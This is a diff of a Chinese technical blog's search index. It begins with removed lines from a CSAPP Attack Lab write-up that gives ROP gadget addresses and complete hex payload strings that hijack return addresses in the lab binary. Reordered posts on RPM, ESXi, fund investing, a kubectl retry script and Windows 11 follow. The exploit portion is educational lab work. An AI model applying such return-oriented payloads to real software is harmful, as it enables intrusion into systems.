-<p>为了将<code>cookie</code>传给<code>%rdi</code>，可以先将<code>cookie</code>的值写到栈，再利用<code>popq %rdi</code>指令实现。</p>
-<p>查表可知<code>pop</code>的编码在<code>58 ~ 5f</code>。全局搜索后没找到<code>5f c3</code>或<code>5f 90 c3</code>，说明不能用<code>$popq %rdi</code>一步到位；但是可以在<code>addval_219</code>中找到<code>58 90 c3</code>，先将栈中的值弹出传到<code>%rax</code>。记录起始地址为<code>0x4019ab</code>。</p>
-<p>接着想办法把<code>%rax</code>的值传递到<code>%rdi</code>。查表，在gadget中找到<code>48 89 c7</code>，也就是<code>movq %rax, %rdi</code>指令，可以在<code>&lt;addval_273&gt;</code>中找到，而且后面正好跟了<code>c3</code>，记录起始地址为<code>0x4019a2</code>。</p>
-<p>到此，我们完成了<code>gadget</code>的拼凑，输入的字符串如下：</p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00							# 改写返回地址为0x4019ab, 执行popq %rax</span><br><span class="line">fa 97 b9 59 00 00 00 00							# 保存cookie的值: 0x59b997fa</span><br><span class="line">a2 19 40 00 00 00 00 00							# 执行mov %rax, %rdi</span><br><span class="line">ec 17 40 00 00 00 00 00							# 跳转到touch2, touch2起始地址为0x4017ec</span><br></pre></td></tr></table></figure>
-
-<p>此时的栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image10.png"></p>
-<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>和第三关类似，这关需要将<code>cookie</code>字符串的首地址传给<code>%rdi</code>, 再调用<code>touch3</code>。</p>
-<p>由于栈位置是随机的，需要用<strong>栈顶地址+偏移</strong>来确定<code>cookie</code>串的位置。 栈顶地址即<code>$rsp</code>，可通过<code>mov %rsp XXX</code>获取，偏移需要根据<code>gadget</code>指令的长度来确定。</p>
-<p>如何将<code>cookie</code>串地址传到<code>%rdi</code>呢？可以在<code>farm.o</code>中可以找到如下的<code>gadget</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:   c3</span><br></pre></td></tr></table></figure>
-
-<p>再结合所有<code>gadget</code>，多次尝试后发现一个可行解，如下：</p>
-<ul>
-<li><p>将<code>%rsp</code>传给<code>%rdi</code>，利用<code>mov</code>实现。</p>
-</li>
-<li><p>将偏移传给<code>%rsi</code>， 需利用<code>pop</code>和多个<code>mov</code>实现。偏移量需要在找到所有<code>gadget</code>后通过计算得出。</p>
-</li>
-<li><p>用<code>lea (%rdi,%rsi,1),%rax</code>，将<code>cookie</code>串的首地址传给<code>%rax</code></p>
-</li>
-<li><p>将<code>%rax</code>传给<code>%rdi</code>，利用<code>mov</code>指令</p>
-</li>
-</ul>
-<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><h5 id="1-将-rsp传给-rdi"><a href="#1-将-rsp传给-rdi" class="headerlink" title="1. 将%rsp传给%rdi"></a>1. 将<code>%rsp</code>传给<code>%rdi</code></h5><p>通过<code>movq %rsp,%rax</code>,<code>movq %rax,%rdi</code>实现：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>
-
-<p><code>movq %rsp,%rax</code>编码为<code>48 89 e0</code>, 地址为<code>0x401aad</code>。</p>
-<p><code>movq %rax %rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019a2</code>。</p>
-<h5 id="2-将偏移传给-rsi"><a href="#2-将偏移传给-rsi" class="headerlink" title="2. 将偏移传给$rsi"></a>2. 将偏移传给<code>$rsi</code></h5><p>先将偏移写到栈里，再通过如下<code>4</code>条指令传到<code>$rsi</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop %rax</span><br><span class="line">mov %eax, %edx</span><br><span class="line">mov %edx, %ecx</span><br><span class="line">mov %ecx, %rsi</span><br></pre></td></tr></table></figure>
-
-<p>在以下的<code>gadget</code>中找到这<code>4</code>条指令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:   c3                      retq</span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:   c3                      retq</span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:   b8 89 d1 38 c9          mov    $0xc938d189,%eax</span><br><span class="line">  401a38:   c3                      retq</span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:   c3                      retq</span><br></pre></td></tr></table></figure>
-
-<p><code>pop %rax</code>编码为<code>58</code>, 地址为<code>0x4019cc</code>。</p>
-<p><code>mov %eax %edx</code>编码为<code>89 c2</code>，地址为<code>0x4019dd</code>。</p>
-<p><code>mov %edx %ecx</code>编码为<code>89 d1</code>，地址为<code>0x401a34</code>。</p>
-<p><code>mov %ecx,%esi</code>编码为<code>89 ce</code>，地址为<code>0x401a13</code>。</p>
-<h5 id="3-将cookie字符串传给-rdi"><a href="#3-将cookie字符串传给-rdi" class="headerlink" title="3. 将cookie字符串传给%rdi"></a>3. 将<code>cookie</code>字符串传给<code>%rdi</code></h5><p>利用<code>lea ($rdi,%rsi,1),%rax</code>，地址为<code>0x4019d6</code>。</p>
-<h5 id="4-将-rax传给-rdi"><a href="#4-将-rax传给-rdi" class="headerlink" title="4. 将%rax传给$rdi"></a>4. 将<code>%rax</code>传给<code>$rdi</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:   c3                      retq</span><br></pre></td></tr></table></figure>
-
-<p><code>mov %rax,%rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019c5</code>。</p>
-<p>到此，我们完成了<code>gadget</code>的构造，只需继续在栈中依次填入<code>touch3</code>返回地址，<code>cookie</code>字符串，<code>0</code>(字符串结束标志)，再确定偏移即可。</p>
-<p>偏移应该是cookie字符串首地址减去(返回地址+0x8)， 中间隔了<code>9</code>条指令，因此偏移量为<code>72</code>, 即<code>0x48</code></p>
-<p>输入的字符串如下：</p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00			# 改写返回地址为0x401aad</span><br><span class="line">a2 19 40 00 00 00 00 00			# 计算偏移的起始地址，返回地址+0x8</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00			# 确定偏移为0x48</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00			# touch3首地址为0x4018fa</span><br><span class="line">35 39 62 39 39 37 66 61			# cookie字符串地址，用这个地址减去计算偏移的起始地址得到偏移量为72, 即0x48</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
-
-<p>此时的栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image11.png"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过这次实验，初步了解栈和缓冲区溢出的原理，以及安全编码的重要性。</p>
-<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》</p>
-<p><a href="https://www.jianshu.com/p/db731ca57342">CSAPP:Attack lab</a></p>
-<p><a href="https://wdxtub.com/csapp/thick-csapp-lab-3/2016/04/16/">读厚CSAPP III Attack Lab</a></p>
-<p><a href="https://blog.csdn.net/sdulibh/article/details/17913815?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">良性代码，恶意利用：浅谈 Return-Oriented 攻击</a></p>
-]]></content>
-      <categories>
-        <category>CSAPP</category>
-      </categories>
-      <tags>
-        <tag>CSAPP</tag>
       </tags>
   </entry>
   <entry>
@@ -1286,8 +1286,8 @@
       </categories>
       <tags>
         <tag>Linux</tag>
-        <tag>troubleshooting</tag>
         <tag>C</tag>
+        <tag>troubleshooting</tag>
       </tags>
   </entry>
   <entry>
@@ -4206,21 +4206,6 @@
       </tags>
   </entry>
   <entry>
-    <title>RPM打包删除/usr/lib/.buildid目录的方法</title>
-    <url>/2023/03/01/2023-03-01-delete-folder-builid-when-use-rpm/</url>
-    <content><![CDATA[<p>Add following line to spec file</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%define _build_id_links none</span><br></pre></td></tr></table></figure>
-<p>参考：<br><a href="https://gohalo.me/post/linux-create-rpm-package.html">https://gohalo.me/post/linux-create-rpm-package.html</a></p>
-]]></content>
-      <categories>
-        <category>RPM</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>RPM</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>VMware Esxi Access to resource settings on the host is restricted to the server...解决方法</title>
     <url>/2023/02/13/2023-02-13-vmware-esxi-access-to-resource-settings-error/</url>
     <content><![CDATA[<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ol>
@@ -4235,6 +4220,21 @@
       </categories>
       <tags>
         <tag>VMware</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RPM打包删除/usr/lib/.buildid目录的方法</title>
+    <url>/2023/03/01/2023-03-01-delete-folder-builid-when-use-rpm/</url>
+    <content><![CDATA[<p>Add following line to spec file</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%define _build_id_links none</span><br></pre></td></tr></table></figure>
+<p>参考：<br><a href="https://gohalo.me/post/linux-create-rpm-package.html">https://gohalo.me/post/linux-create-rpm-package.html</a></p>
+]]></content>
+      <categories>
+        <category>RPM</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>RPM</tag>
       </tags>
   </entry>
   <entry>
@@ -5543,6 +5543,25 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
       </tags>
   </entry>
   <entry>
+    <title>购买基金前应阅读基金招募说明书</title>
+    <url>/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/</url>
+    <content><![CDATA[<p>3月8号，华泰天金ETF(511670)离奇暴涨6.17%, 收盘价106.17元。作为一个净值100元的货币基金，正常收益一年也就2%，单日6%的溢价相当于用1天时间提前兑现3年的收益，一个货币基金也可以玩这么嗨，我实在是无法理解！</p>
+<span id="more"></span>
+<p><img data-src="/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/image1.png"></p>
+<p>据传言，是因为大爷大妈们看到基金的名字中带有黄金，误以为是投资黄金的ETF，所以一通乱买把价格炒上去了。3月12日，华泰天金ETF以100.999元收盘，单日暴跌7%，高溢价买入的”投资者”们损失惨重，着实当了一回韭菜。</p>
+<p>从韭菜们的经历中，我们可以吸取教训：<strong>在购买一个基金前，我们需要知道这个基金的底层资产是什么</strong>，了解这个基金的投资范围，投资策略，基金费用，交易规则，这些信息可以在基金招募说明书里找到。</p>
+<p>以华泰天金ETF为例，可以从华泰官网上找到基金招募说明书。查看“基金的投资”部分，可以看出这是货币基金。<br><img data-src="/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/image2.png"></p>
+<p>查看基金说明书中“基金份额的申购与赎回”部分，发现华泰天金ETF的净值始终为100元，无申购赎回费，T日申购T+2日到账。<br><img data-src="/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/image3.png"><br><img data-src="/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/image4.png"></p>
+<p>这意味着，如果你在3月8号以净值100元申购，3月12日以开盘价102元卖出，4天收益率2%，年化收益高达182%！<strong>韭菜们的钱，挺容易赚的</strong> ^_^</p>
+]]></content>
+      <categories>
+        <category>investment</category>
+      </categories>
+      <tags>
+        <tag>investment</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>标普500LOF又来送钱，一拖七拖拉机开起来！</title>
     <url>/2024/03/22/2024-03-22-sp500-lof-give-money/</url>
     <content><![CDATA[<p>标普500LOF(161125)公告，3月22日开放申购，限额申购100元，溢价率达到了离谱的40%！！！为了平抑这不合理的溢价，我决定用一拖七拖拉机狠狠拖它一把！</p>
@@ -5563,25 +5582,6 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
 ]]></content>
       <categories>
         <category>套利往事</category>
-      </categories>
-      <tags>
-        <tag>investment</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>购买基金前应阅读基金招募说明书</title>
-    <url>/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/</url>
-    <content><![CDATA[<p>3月8号，华泰天金ETF(511670)离奇暴涨6.17%, 收盘价106.17元。作为一个净值100元的货币基金，正常收益一年也就2%，单日6%的溢价相当于用1天时间提前兑现3年的收益，一个货币基金也可以玩这么嗨，我实在是无法理解！</p>
-<span id="more"></span>
-<p><img data-src="/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/image1.png"></p>
-<p>据传言，是因为大爷大妈们看到基金的名字中带有黄金，误以为是投资黄金的ETF，所以一通乱买把价格炒上去了。3月12日，华泰天金ETF以100.999元收盘，单日暴跌7%，高溢价买入的”投资者”们损失惨重，着实当了一回韭菜。</p>
-<p>从韭菜们的经历中，我们可以吸取教训：<strong>在购买一个基金前，我们需要知道这个基金的底层资产是什么</strong>，了解这个基金的投资范围，投资策略，基金费用，交易规则，这些信息可以在基金招募说明书里找到。</p>
-<p>以华泰天金ETF为例，可以从华泰官网上找到基金招募说明书。查看“基金的投资”部分，可以看出这是货币基金。<br><img data-src="/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/image2.png"></p>
-<p>查看基金说明书中“基金份额的申购与赎回”部分，发现华泰天金ETF的净值始终为100元，无申购赎回费，T日申购T+2日到账。<br><img data-src="/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/image3.png"><br><img data-src="/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/image4.png"></p>
-<p>这意味着，如果你在3月8号以净值100元申购，3月12日以开盘价102元卖出，4天收益率2%，年化收益高达182%！<strong>韭菜们的钱，挺容易赚的</strong> ^_^</p>
-]]></content>
-      <categories>
-        <category>investment</category>
       </categories>
       <tags>
         <tag>investment</tag>
@@ -5626,21 +5626,6 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
       </tags>
   </entry>
   <entry>
-    <title>kubectl执行失败后等待一段时间重试(Shell实现)</title>
-    <url>/2024/03/28/2024-03-28-kubectl-add-retry/</url>
-    <content><![CDATA[<p>使用Shell脚本实现功能： <code>kubectl</code>执行失败后，等待30秒后再重试，一共重试3次，代码如下：</p>
-<span id="more"></span>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">KUBECTL_BIN=/var/lib/snapd/snap/bin/kubectl</span><br><span class="line"></span><br><span class="line">ERR_MSG_K8S_NOTRUNNING=<span class="string">&quot;microk8s is not running&quot;</span></span><br><span class="line">ERR_MSG_CONNECTION_TIMEOUT=<span class="string">&quot;connection timed out&quot;</span></span><br><span class="line">ERR_MSG_CONNECTION_REFUSED=<span class="string">&quot;refused - did you specify the right host or port&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">debuglog</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> log_content=<span class="variable">$&#123;@:1&#125;</span></span><br><span class="line">    <span class="built_in">local</span> <span class="built_in">caller</span>=$(<span class="built_in">basename</span> <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;`date +&quot;</span>%Y-%m-%d %H:%M:%S<span class="string">&quot;` [<span class="variable">$caller</span>] INFO <span class="variable">$log_content</span>&quot;</span> 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">api_kubectlX</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> retry=<span class="variable">$1</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line">    <span class="built_in">local</span> args=<span class="variable">$@</span></span><br><span class="line">    <span class="built_in">local</span> ret=0</span><br><span class="line">    <span class="built_in">local</span> cmdstr=<span class="string">&quot;<span class="variable">$&#123;args[@]&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">local</span> tmpfile=$(<span class="built_in">mktemp</span>)</span><br><span class="line">    <span class="keyword">for</span> ((i=<span class="number">0</span>;i&lt;<span class="variable">$retry</span>;i++)); <span class="keyword">do</span></span><br><span class="line">        <span class="variable">$&#123;KUBECTL_BIN&#125;</span> <span class="variable">$@</span> 2&gt;<span class="string">&quot;<span class="variable">$tmpfile</span>&quot;</span></span><br><span class="line">        ret=$?</span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$ret</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">            debuglog <span class="string">&quot;KUBECTL <span class="variable">$cmdstr</span> ret: 0&quot;</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">local</span> errinfo=$(&lt; <span class="string">&quot;<span class="variable">$tmpfile</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">local</span> need_retry=<span class="string">&quot;no&quot;</span></span><br><span class="line">        <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="subst">$(echo <span class="string">&quot;<span class="variable">$errinfo</span>&quot;</span> | grep <span class="string">&quot;<span class="variable">$ERR_MSG_K8S_NOTRUNNING</span>&quot;</span>)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> [ -n <span class="string">&quot;<span class="subst">$(echo <span class="string">&quot;<span class="variable">$errinfo</span>&quot;</span> | grep <span class="string">&quot;<span class="variable">$ERR_MSG_CONNECTION_TIMEOUT</span>&quot;</span>)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> [ -n <span class="string">&quot;<span class="subst">$(echo <span class="string">&quot;<span class="variable">$errinfo</span>&quot;</span> | grep <span class="string">&quot;<span class="variable">$ERR_MSG_CONNECTION_REFUSED</span>&quot;</span>)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="variable">$ret</span> -eq 143 ]; <span class="keyword">then</span> <span class="comment"># 143 means SIGTERM, just retry</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            need_retry=<span class="string">&quot;no&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$need_retry</span> != <span class="string">&quot;yes&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            debuglog <span class="string">&quot;KUBECTL ret: <span class="variable">$ret</span>/(<span class="variable">$errinfo</span>) <span class="variable">$cmdstr</span>&quot;</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        debuglog <span class="string">&quot;KUBECTL ret: <span class="variable">$ret</span>/(<span class="variable">$errinfo</span>) (retry:<span class="variable">$i</span>) <span class="variable">$cmdstr</span>&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 30</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">rm</span> -- <span class="variable">$&#123;tmpfile&#125;</span></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$ret</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">api_kubectl</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> args=(3 <span class="string">&quot;<span class="variable">$@</span>&quot;</span>)</span><br><span class="line">    api_kubectlX <span class="string">&quot;<span class="variable">$&#123;args[@]&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">return</span> $?</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用方法：</span></span><br><span class="line">api_kubectl get ns</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>k8s</category>
-      </categories>
-      <tags>
-        <tag>k8s</tag>
-        <tag>Shell</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Centos7.9上安装Docker</title>
     <url>/2024/03/28/2024-03-28-how-to-install-docker-on-centos7/</url>
     <content><![CDATA[<p>移除旧版本Docker</p>
@@ -5663,6 +5648,21 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
       </categories>
       <tags>
         <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kubectl执行失败后等待一段时间重试(Shell实现)</title>
+    <url>/2024/03/28/2024-03-28-kubectl-add-retry/</url>
+    <content><![CDATA[<p>使用Shell脚本实现功能： <code>kubectl</code>执行失败后，等待30秒后再重试，一共重试3次，代码如下：</p>
+<span id="more"></span>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">KUBECTL_BIN=/var/lib/snapd/snap/bin/kubectl</span><br><span class="line"></span><br><span class="line">ERR_MSG_K8S_NOTRUNNING=<span class="string">&quot;microk8s is not running&quot;</span></span><br><span class="line">ERR_MSG_CONNECTION_TIMEOUT=<span class="string">&quot;connection timed out&quot;</span></span><br><span class="line">ERR_MSG_CONNECTION_REFUSED=<span class="string">&quot;refused - did you specify the right host or port&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">debuglog</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> log_content=<span class="variable">$&#123;@:1&#125;</span></span><br><span class="line">    <span class="built_in">local</span> <span class="built_in">caller</span>=$(<span class="built_in">basename</span> <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;`date +&quot;</span>%Y-%m-%d %H:%M:%S<span class="string">&quot;` [<span class="variable">$caller</span>] INFO <span class="variable">$log_content</span>&quot;</span> 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">api_kubectlX</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> retry=<span class="variable">$1</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line">    <span class="built_in">local</span> args=<span class="variable">$@</span></span><br><span class="line">    <span class="built_in">local</span> ret=0</span><br><span class="line">    <span class="built_in">local</span> cmdstr=<span class="string">&quot;<span class="variable">$&#123;args[@]&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">local</span> tmpfile=$(<span class="built_in">mktemp</span>)</span><br><span class="line">    <span class="keyword">for</span> ((i=<span class="number">0</span>;i&lt;<span class="variable">$retry</span>;i++)); <span class="keyword">do</span></span><br><span class="line">        <span class="variable">$&#123;KUBECTL_BIN&#125;</span> <span class="variable">$@</span> 2&gt;<span class="string">&quot;<span class="variable">$tmpfile</span>&quot;</span></span><br><span class="line">        ret=$?</span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$ret</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">            debuglog <span class="string">&quot;KUBECTL <span class="variable">$cmdstr</span> ret: 0&quot;</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">local</span> errinfo=$(&lt; <span class="string">&quot;<span class="variable">$tmpfile</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">local</span> need_retry=<span class="string">&quot;no&quot;</span></span><br><span class="line">        <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="subst">$(echo <span class="string">&quot;<span class="variable">$errinfo</span>&quot;</span> | grep <span class="string">&quot;<span class="variable">$ERR_MSG_K8S_NOTRUNNING</span>&quot;</span>)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> [ -n <span class="string">&quot;<span class="subst">$(echo <span class="string">&quot;<span class="variable">$errinfo</span>&quot;</span> | grep <span class="string">&quot;<span class="variable">$ERR_MSG_CONNECTION_TIMEOUT</span>&quot;</span>)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> [ -n <span class="string">&quot;<span class="subst">$(echo <span class="string">&quot;<span class="variable">$errinfo</span>&quot;</span> | grep <span class="string">&quot;<span class="variable">$ERR_MSG_CONNECTION_REFUSED</span>&quot;</span>)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="variable">$ret</span> -eq 143 ]; <span class="keyword">then</span> <span class="comment"># 143 means SIGTERM, just retry</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            need_retry=<span class="string">&quot;no&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$need_retry</span> != <span class="string">&quot;yes&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            debuglog <span class="string">&quot;KUBECTL ret: <span class="variable">$ret</span>/(<span class="variable">$errinfo</span>) <span class="variable">$cmdstr</span>&quot;</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        debuglog <span class="string">&quot;KUBECTL ret: <span class="variable">$ret</span>/(<span class="variable">$errinfo</span>) (retry:<span class="variable">$i</span>) <span class="variable">$cmdstr</span>&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 30</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">rm</span> -- <span class="variable">$&#123;tmpfile&#125;</span></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$ret</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">api_kubectl</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> args=(3 <span class="string">&quot;<span class="variable">$@</span>&quot;</span>)</span><br><span class="line">    api_kubectlX <span class="string">&quot;<span class="variable">$&#123;args[@]&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">return</span> $?</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用方法：</span></span><br><span class="line">api_kubectl get ns</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>k8s</category>
+      </categories>
+      <tags>
+        <tag>k8s</tag>
+        <tag>Shell</tag>
       </tags>
   </entry>
   <entry>
@@ -6155,6 +6155,21 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
       </tags>
   </entry>
   <entry>
+    <title>Win11右键默认显示更多选项的方法</title>
+    <url>/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/</url>
+    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>win11系统默认右键菜单显示选项太少，每次需要点一下“显示更多选项”才能得到想要内容。比方说我用notepad++打开一个文档，在win11上要先点一下”显示更多选项“，再选择用notepad++打开，操作非常反人类。</p>
+<span id="more"></span>
+<p><img data-src="/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/image1.png"></p>
